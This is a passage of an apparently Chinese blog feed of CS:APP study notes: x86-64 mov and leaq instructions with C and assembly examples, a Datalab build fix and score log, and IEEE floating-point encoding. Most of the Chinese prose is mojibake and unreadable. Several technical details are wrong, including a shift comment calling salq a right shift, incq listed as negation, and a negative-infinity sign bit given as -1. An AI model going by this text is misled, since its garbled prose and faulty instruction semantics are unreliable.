\text{Reg}   \left { \begin{matrix} \text{Reg} &amp;amp;&amp;amp; \text{movq %rax,%rdx} &amp;amp;&amp;amp; \text{æŠŠ%raxçš„å€¼å¤åˆ¶åˆ°%rdx}\ \text{Mem} &amp;amp;&amp;amp;  \text{movq;%rax,(%rdx)}&amp;amp;&amp;amp;\text{æŠŠ%raxçš„å€¼å¤åˆ¶åˆ°%rdxæŒ‡å‘çš„å†…å­˜}\ \end{matrix}\right. \&lt;br&gt;\text{Mem};;;;;;;; \text{Reg} ;;;;;;;\text{movq;(%rax),%rdx};;;;;;\text{æŠŠ%raxæŒ‡å‘çš„å†…å­˜çš„å†…å®¹å¤åˆ¶åˆ°%rdx} \
 \end{matrix}\right.
$$
ä¸å…è®¸ä»ä¸€ä¸ªå†…å­˜ç›´æ¥å¤åˆ¶åˆ°å¦ä¸€ä¸ªå†…å­˜,ç«‹å³æ•°æ˜¯å¸¸é‡ä¸èƒ½å½“&amp;quot;å³å€¼&amp;quot;,æ‰€ä»¥ä¸€å…±æœ‰5ä¸­ç»„åˆ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸€ä¸ªç®€å•çš„ä¾‹å­&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void swap(long *xp,long *yp){
	long t0 = *xp;
	long t1 = *yp;
	*xp = t1;
	*yp = t0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªç®€å•çš„äº¤æ¢å†…å­˜ä¸­ä¸¤ä¸ªæ•°çš„å‡½æ•°,(longç±»å‹åˆšå¥½èƒ½ç”¨%rçš„6ä½æ¨¡å¼),å¯¹åº”ç”Ÿæˆçš„æ±‡ç¼–ä»£ç çš„æ ¸å¿ƒéƒ¨åˆ†ä¸º:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;swap:
	movq (%rdi), %rax
	movq (%rsi), %rdx
	movq %rdx, (%rdi)
	movq %rax, (%rsi)
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œè§£é‡Šä¸€ä¸‹,åœ¨x86ä¸­,å‡½æ•°çš„å‚æ•°æ€»æ˜¯å¤åˆ¶åœ¨ç‰¹å®šçš„å¯„å­˜å™¨ä¸­:
%rdiæ˜¯å­˜æ”¾ç¬¬ä¸€ä¸ªå‚æ•°å¯„å­˜å™¨
%rsiæ˜¯å­˜æ”¾ç¬¬äºŒä¸ªå‚æ•°å¯„å­˜å™¨
%raxæ˜¯å­˜æ”¾è¿”å›å€¼çš„å¯„å­˜å™¨
æœ€å¤šå¯ä»¥æœ‰6ä¸ª.&lt;/p&gt;
&lt;h2&gt;å†…å­˜åœ°å€çš„å¼•ç”¨æ–¹å¼&lt;/h2&gt;
&lt;p&gt;ä¸Šé¢æˆ‘ä»¬å·²ç»çœ‹åˆ°é€šè¿‡åœ¨å¯„å­˜å™¨åç§°å¤–åŠ æ‹¬å·èƒ½å¤Ÿè¡¨ç¤ºå¯„å­˜å™¨çš„å€¼æŒ‡å‘çš„å†…å­˜.ä¹Ÿæœ‰æ›´é«˜çº§,æ™®éçš„æ–¹æ³•:&lt;/p&gt;
&lt;h3&gt;ä¸€èˆ¬æ ¼å¼&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;D(Rb,Ri,S)&lt;/code&gt;è¡¨ç¤ºMem[Reg[Rb]+S*Reg[Ri]+D]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;D(displacement)æ˜¯å›ºå®šåç§»é‡(å­—èŠ‚)&lt;/li&gt;
&lt;li&gt;Rb(base register)æ˜¯åŸºå€:ä»»æ„16ä¸ªå¯„å­˜å™¨ä¹‹ä¸€&lt;/li&gt;
&lt;li&gt;Ri(index register)æ˜¯ç´¢å¼•:é™¤äº†%rspçš„ä»»æ„å¯„å­˜å™¨&lt;/li&gt;
&lt;li&gt;S(scale)æ˜¯æ¯”ä¾‹å› å­:(1 for char,2 for short,4 for intæˆ–8for long).&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ç‰¹æ®Šæ ¼å¼&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;æ ¼å¼&lt;/th&gt;
&lt;th&gt;è¡¨ç¤ºçš„å†…å­˜&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;(Rb,Ri) &lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Mem[Reg[Rb]+Reg[Ri]]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;D(Rb,Ri)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Mem[Reg[Rb]+Reg[Ri]+D]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;(Rb,Ri,S)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Mem[Reg[Rb]+S*Reg[Ri]]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;D(,Ri,S)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Mem[S*Reg[Ri]+D]&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;leaqæŒ‡ä»¤&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;leaq src,dst&lt;/code&gt;:srcæ˜¯ä¸€å—å†…å­˜,å°†å…¶å¯¹åº”çš„åœ°å€ä¿å­˜åˆ°dst.ç±»ä¼¼äºCè¯­è¨€ä¸­çš„&amp;amp;å–å€¼è¿ç®—ç¬¦.dstå¿…é¡»æ˜¯å¯„å­˜å™¨.
çœ‹èµ·æ¥åƒæ˜¯movæŒ‡ä»¤,ä½†è¿™æ˜¯ä¸€ç§éå¸¸æ–¹ä¾¿çš„ç®—æœ¯è¿ç®—æ–¹å¼,æ— éœ€å†…å­˜å¼•ç”¨,æ‰€ä»¥Cç¼–è¯‘å™¨å–œæ¬¢ä½¿ç”¨å®ƒ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸€ä¸ªç®€å•çš„ä¾‹å­&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long m12(long x){
	return x*12;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹åº”çš„æ±‡ç¼–ä»£ç çš„æ ¸å¿ƒéƒ¨åˆ†:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;leaq (%rdi,%rdi,2), %ras    # t = x+x*2
salq $2, %rax               # å³ç§»2ä½,ç›¸å½“äºä¹˜4
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;å…¶ä»–æŒ‡ä»¤&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;æŒ‡ä»¤&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;å¯¹åº”ä»£ç &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;addq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst += src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;subq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst -= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;imulq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst *= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;salq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;lt;&amp;lt;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;sarq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;gt;&amp;gt;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;shlq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;lt;&amp;lt;&amp;lt;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;shrq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;gt;&amp;gt;&amp;gt;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;xorq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst ^= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;andq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;amp;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;orq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;amp;#124= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;notq dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst = ~dst;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;incq dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst += 1;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;decq dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst -= 1;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;incq dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst = -dst;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1&gt;æ€»ç»“&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long arith (long x, long y, long z) {
	long t1 = x+y; 
	long t2 = z+t1; 
	long t3 = x+4; 
	long t4 = y * 48; 
	long t5 = t3 + t4; 
	long rval = t2 * t5; 
	return rval; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;arith: 
	leaq (%rdi,%rsi), %rax           # t1 
	addq %rdx, %rax                  # t2 
	leaq (%rsi,%rsi,2), %rdx 
	salq $4, %rdx                    # t4 
	leaq 4(%rdi,%rdx), %rcx          # t5 
	imulq %rcx, %rax                 # rval 
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»æ•°å­¦ç‰©ç†ä¸–ç•Œè·¨è¿›è®¡ç®—æœºä¸–ç•Œ,å…ˆæ˜¯æ¥è§¦Pythonè¯­è¨€,åæ¥å­¦ä¹ Cè¯­è¨€,åˆ°å¦‚ä»Šä¸æ±‡ç¼–è¯­è¨€äº¤æ‰‹,å›æƒ³èµ·æ¥çœŸæ˜¯å¿ƒæ½®æ¾æ¹ƒ!ä¸€å¼€å§‹å†™Pythonä»£ç ,è¿ç®€å•çš„å¾ªç¯éƒ½è¦Debugå¥½ä¹…,åæ¥å­¦ä¹ äº†Cè¯­è¨€,ç›¸æ¯”èµ·æ¥è§‰å¾—Pythonéå¸¸ç®€å•å•Š,å¦‚ä»Šæ¥è§¦æ±‡ç¼–è¯­è¨€è¿™æ ·å¥‡æ€ªæ›²æŠ˜çš„è¡¨è¾¾æ–¹å¼,çªç„¶è§‰å¾—Cè¯­è¨€æ ¹æœ¬å°±åƒè‹±è¯­ä¸€æ ·è‡ªç„¶äº†!&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Thu, 16 Jan 2025 16:00:00 GMT</pubDate></item><item><title>Datalab</title><link>https://www.tankimzeg.top/blog/datalab/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/datalab/</guid><description>Datalab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/datalab/&quot;&gt;https://www.tankimzeg.top/blog/datalab/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;è¿™æ˜¯ç¬¬ä¸€ä¸ªå®éªŒ.æˆ‘è¿˜æ²¡å¼€å§‹å†™å‘¢,å…ˆåœ¨datalab-handoutæ–‡ä»¶å¤¹ä¸‹ä¸€ä½¿ç”¨makeæ„å»º,ç«‹å³æŠ¥é”™:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -O1 -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c
In file included from btest.c:16:
/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory
   27 | #include &amp;lt;bits/libc-header-start.h&amp;gt;
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
In file included from decl.c:1:
/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory
   27 | #include &amp;lt;bits/libc-header-start.h&amp;gt;
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
In file included from /usr/lib/gcc/x86_64-linux-gnu/12/include/limits.h:203,
                 from /usr/lib/gcc/x86_64-linux-gnu/12/include/syslimits.h:7,
                 from /usr/lib/gcc/x86_64-linux-gnu/12/include/limits.h:34,
                 from tests.c:3:
/usr/include/limits.h:26:10: fatal error: bits/libc-header-start.h: No such file or directory
   26 | #include &amp;lt;bits/libc-header-start.h&amp;gt;
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
make: *** [Makefile:11: btest] Error 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ˜¾ç„¶,è¿™é‡Œç¼ºå°‘ä¸€ä¸ªå¤´æ–‡ä»¶.æ‰¾åˆ°çš„è§£å†³åŠæ³•æ˜¯:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt update
sudo apt-get install gcc-multilib
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ¯æ¬¡ä¿®æ”¹å,è¿è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;make &amp;amp;&amp;amp; ./btest
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¼šè‡ªåŠ¨æ£€æŸ¥ç»“æœæ˜¯å¦æ­£ç¡®.è‡³äºå…¶ä»–æ–‡ä»¶å¤¹,ç›®å‰ä¸äº†è§£æ˜¯ä»€ä¹ˆç”¨å¤„,å¯ä»¥æŸ¥çœ‹READMEæ–‡ä»¶&lt;/p&gt;
&lt;p&gt;æˆ‘è‡ªå·±åšäº†ä¸€ä¸‹,çœŸæ˜¯ç–¯ç‹‚!ä»æ²¡æƒ³è¿‡è¿™äº›ä¸ç”¨å¾ªç¯,æ§åˆ¶è¯­å¥çš„ç®—æ³•!ä¹Ÿç”¨ä¸Šäº†ä¸€äº›é€»è¾‘å­¦è¿ç®—çš„çŸ¥è¯†æ‰èƒ½å‹‰å¼ºè§£å†³!&lt;/p&gt;
&lt;p&gt;ç½‘ä¸Šçš„ç­”æ¡ˆä¸­,è¿™ä»½å†™çš„ä¸é”™:
&lt;a href=&quot;https://zhuanlan.zhihu.com/p/472188244&quot;&gt;CSAPP | Lab1-Data Lab æ·±å…¥è§£æ - çŸ¥ä¹&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç»ˆäºæˆåŠŸå†™å®Œ!éå¸¸æœ‰æˆå°±æ„Ÿ!ä¹Ÿè®©æˆ‘æ„è¯†åˆ°è‡ªå·±çš„ä¸è¶³.è¿™ä¸ªå®éªŒåšäº†å¾ˆä¹…,å¯èƒ½æœ‰10å°æ—¶.æˆ‘æ„Ÿè§‰æˆ‘çš„æ€ç»´ä»æ¥æ²¡æœ‰æ¥åˆ°è¿‡è¿™ä¸€å±‚.çœ‹ä¼¼ç®€å•çš„æ“ä½œ,éœ€è¦è€ƒè™‘çš„æƒ…å†µéå¸¸ç¹æ‚.CMUä¸æ„§æ˜¯åç‰Œå¤§å­¦,æ•™å­¦è´¨é‡çœŸçš„ç‹ ,ä¸æ˜¯å¹³åº¸ä¹‹äººèƒ½éšæ„å­¦ä¼šçš„.&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€ä¸ªå®éªŒå°±å¦‚æ­¤ä¸°å¯Œ,ä¸‹ä¸ªå®éªŒæ›´æ˜¯å¤§åé¼é¼çš„bomblab,éå¸¸æœŸå¾…!&lt;/p&gt;
&lt;p&gt;æœ€åæ¬£èµä¸€ä¸‹å…¨éƒ¨passçš„ç»“æœ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kim@MyDell:/mnt/e/Documents/C/CSAPP/datalab-handout$ make &amp;amp;&amp;amp; ./btest
gcc -O1 -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c
btest.c: In function â€˜test_functionâ€™:
btest.c:334:23: warning: â€˜arg_test_rangeâ€™ may be used uninitialized [-Wmaybe-uninitialize ]
  334 |     if (arg_test_range[2] &amp;lt; 1)
      |         ~~~~~~~~~~~~~~^~~
btest.c:299:9: note: â€˜arg_test_rangeâ€™ declared here
  299 |     int arg_test_range[3]; /* test range for each argument */
      |         ^~~~~~~~~~~~~~
Score   Rating  Errors  Function
 1      1       0       bitXor
 1      1       0       tmin
 2      2       0       isTmax
 2      2       0       allOddBits
 2      2       0       negate
 3      3       0       isAsciiDigit
 3      3       0       conditional
 3      3       0       isLessOrEqual
 4      4       0       logicalNeg
 4      4       0       howManyBits
 4      4       0       float_twice
 4      4       0       float_i2f
 4      4       0       float_f2i
Total points: 37/37
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Tue, 14 Jan 2025 16:00:00 GMT</pubDate></item><item><title>æµ®ç‚¹æ•°</title><link>https://www.tankimzeg.top/blog/%E6%B5%AE%E7%82%B9%E6%95%B0-floating-point/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E6%B5%AE%E7%82%B9%E6%95%B0-floating-point/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E6%B5%AE%E7%82%B9%E6%95%B0-floating-point/&quot;&gt;https://www.tankimzeg.top/blog/%E6%B5%AE%E7%82%B9%E6%95%B0-floating-point/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;CS:APP     Page  75~87&lt;/p&gt;
&lt;h1&gt;èƒŒæ™¯:äºŒè¿›åˆ¶çš„æµ®ç‚¹æ•°,åˆ†æ•°&lt;/h1&gt;
&lt;p&gt;åœ¨è®¡ç®—æœºä¸­,ç”¨äºŒè¿›åˆ¶çš„æµ®ç‚¹æ•°è¡¨ç¤ºå®æ•°
![](attachments/Pasted image%2020250115201705.png%20)
å³
$$ \sum_{k=-j}^{i} b_{k} \times 2^k $$
ä¾‹å¦‚
$$5 \frac{3}{4}=(101.11)&lt;em&gt;{2}$$
$$ 2 \frac{7}{8} = (10.111)&lt;/em&gt;{2}$$
$$ 1 \frac{7}{16} = (1.0111)&lt;em&gt;{2}$$
è€Œ
$$0.1111\dots&lt;/em&gt;{2} = \frac{1}{2}+\frac{1}{4}+\frac{1}{8}+\frac{1}{16}+\dots+\frac{1}{2^{n}}+\dots \to 1.0 $$&lt;/p&gt;
&lt;p&gt;æœ‰äº›å°æ•°åˆ™ä¸èƒ½æœ‰æœ‰é™ä½æ•°è¡¨ç¤º,ä¾‹å¦‚
$$ \frac{1}{3} = 0.010101[01]\dots_{2}$$
$$ \frac{1}{5} = 0.00110011[0011]\dots_{2}$$
$$ \frac{1}{10} = 0.000110011[0011]\dots_{2}$$
è€Œåœ¨è®¡ç®—æœºä¸­,å­˜å‚¨ä½æ•°æ˜¯æœ‰é™çš„.æ‰€ä»¥ä¸ºäº†æé«˜ç²¾åº¦å°±éœ€è¦å‡å°æ•´æ•°éƒ¨åˆ†çš„ä½æ•°;ä¸ºäº†å¢åŠ æ•´æ•°éƒ¨åˆ†çš„ä½æ•°å°±éœ€è¦é™ä½ç²¾åº¦.&lt;/p&gt;
&lt;h2&gt;äºŒè¿›åˆ¶æµ®ç‚¹æ•°çš„ç§‘å­¦è®¡æ•°æ³•&lt;/h2&gt;
&lt;p&gt;$$(-1)^sM\cdot 2^E$$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sæ˜¯ç¬¦å·ä½(sign),å†³å®šäº†æ­£è´Ÿ&lt;/li&gt;
&lt;li&gt;å°¾æ•°(significand)çš„èŒƒå›´æ˜¯[1.0,2.0)&lt;/li&gt;
&lt;li&gt;é˜¶ç E(exponent)ä¼šä»¥2çš„Eæ¬¡å¹‚æ‰©å¤§å°¾æ•°&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;IEEEæµ®ç‚¹æ•°æ ‡å‡†&lt;/h1&gt;
&lt;h2&gt;ç²¾åº¦&lt;/h2&gt;
&lt;p&gt;ä¸¤ä¸ªIEEEæ ‡å‡†:å•ç²¾åº¦å’ŒåŒç²¾åº¦:
![](attachments/Pasted image%2020250115203736.png%20)&lt;/p&gt;
&lt;h2&gt;æƒ…å†µ1:è§„æ ¼åŒ–çš„å€¼&lt;/h2&gt;
&lt;p&gt;ä¸Šå›¾ä¸­,
å½“é˜¶ç ä¸å…¨ä¸º0ä¹Ÿä¸å…¨ä¸º1çš„æ—¶å€™exp â‰  000...0 å¹¶ä¸”exp â‰  111...1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é˜¶ç å­—æ®µexp = E + bias&lt;ul&gt;
&lt;li&gt;é˜¶ç æ˜¯unsignedç±»å‹&lt;/li&gt;
&lt;li&gt;åç§»é‡bias = 2^{k-1} - 1,kæ˜¯é˜¶ç ä½çš„ä½æ•°:&lt;ul&gt;
&lt;li&gt;å¯¹äºå•ç²¾åº¦æ˜¯127(exp:1&lt;del&gt;254,E:-126&lt;/del&gt;127)&lt;/li&gt;
&lt;li&gt;å¯¹äºåŒç²¾åº¦æ˜¯1023(exp:1&lt;del&gt;2046,E:-1022&lt;/del&gt;1023)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å°¾æ•°çš„ç¼–ç éšå«äº†æ•´æ•°éƒ¨åˆ†å‰å¯¼1:M=1.xxxx&lt;ul&gt;
&lt;li&gt;xxxxå°±æ˜¯å°æ•°å­—æ®µfracçš„æ¯”ç‰¹&lt;/li&gt;
&lt;li&gt;M=1.0,å°æ•°å­—æ®µæ˜¯000...0;M=2-Îµ,å°æ•°å­—æ®µæ˜¯111...1&lt;/li&gt;
&lt;li&gt;è¿™ç§æ–¹æ³•è·å¾—äº†ä¸€ä¸ªé¢å¤–ç²¾åº¦&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ä¸¾ä¾‹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ä»¥æµ®ç‚¹æ•°15213.0ä¸ºä¾‹
 &lt;code&gt;float F = 15213.0f;&lt;/code&gt;
 $$15213_{10} = 11101101101101_{2} = 1.1101101101101_{2}\times 2^{13}$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è¿‡ç¨‹
 $$M = 1.\underline{1101101101101}&lt;em&gt;{2} $$
 $$ frac = \underline{1101101101101} 0000000000&lt;/em&gt;{2}$$
 $$ E = 13$$
 $$ Bias = 127   $$
 $$ Exp = 140 = 10001100_{2} $$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç»“æœ&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;0&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;10001100&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;11011011011010000000000&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;s&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;exp&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;frac&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æƒ…å†µ2:éè§„æ ¼åŒ–çš„å€¼&lt;/h2&gt;
&lt;p&gt;å½“é˜¶ç åŸŸexpå…¨ä¸º0(exp = 000...0)æ—¶,æ‰€è¡¨ç¤ºçš„æ•°æ˜¯éè§„æ ¼åŒ–å½¢å¼&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é˜¶ç çš„å€¼E=1-Biasè€Œä¸æ˜¯-Bias&lt;/li&gt;
&lt;li&gt;å°¾æ•°çš„ç¼–ç éšå«äº†æ•´æ•°éƒ¨åˆ†å‰å¯¼0:M=0.xxxx&lt;ul&gt;
&lt;li&gt;xxxxå°±æ˜¯å°æ•°å­—æ®µfracçš„æ¯”ç‰¹&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;exp = 000...0,frac = 000...0&lt;ul&gt;
&lt;li&gt;è¡¨ç¤º0&lt;/li&gt;
&lt;li&gt;å¯¹äº+1å’Œ-1çš„ç¬¦å·ä½æœ‰+0.0å’Œ-0.0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;exp = 000...0,frac â‰  000...0&lt;ul&gt;
&lt;li&gt;è¡¨ç¤ºéå¸¸æ¥è¿‘äº0çš„æ•°&lt;/li&gt;
&lt;li&gt;åˆ†å¸ƒå‡åŒ€åœ°æ¥è¿‘äº0.0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æƒ…å†µ3:ç‰¹æ®Šå€¼&lt;/h2&gt;
&lt;p&gt;å½“é˜¶ç åŸŸexpå…¨ä¸º1(exp=111...1)çš„æ—¶å€™&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;frac=000...0&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è¡¨ç¤ºæ— ç©·âˆ(Infinity)&lt;/li&gt;
&lt;li&gt;èƒ½å¤Ÿè¡¨ç¤ºæº¢å‡ºçš„ç»“æœ&lt;/li&gt;
&lt;li&gt;å½“s=0æ—¶æ˜¯+âˆ;å½“s=-1æ—¶æ˜¯-âˆ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;fracâ‰ 000...0&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è¡¨ç¤ºä¸æ˜¯ä¸€ä¸ªæ•°(NaN)&lt;/li&gt;
&lt;li&gt;èƒ½å¤Ÿè¡¨ç¤ºè¿ç®—ç»“æœä¸æ˜¯å®æ•°æˆ–æ— ç©·,ä¾‹å¦‚sqrt(-1),âˆ-âˆ,âˆ*0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;åœ¨æ•°è½´ä¸Šçš„åˆ†å¸ƒ&lt;/h2&gt;
&lt;p&gt;![](attachments/Pasted image%2020250115235636.png%20)
è§„æ ¼åŒ–çš„å€¼ä¸æ˜¯å‡åŒ€åˆ†å¸ƒçš„;éè§„æ ¼åŒ–çš„å€¼èšé›†åœ¨0é™„è¿‘,å¹¶ä¸”æ˜¯å‡åŒ€åˆ†å¸ƒçš„.&lt;/p&gt;
&lt;h2&gt;æ•°å­—ç¤ºä¾‹:ä»¥8ä½æµ®ç‚¹æ ¼å¼ä¸ºä¾‹&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;s&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;exp&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;frac&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;1-bit&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;4-bit&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;3-bit&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;åç§»é‡ Bias = 2^ (4-1) = 7&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
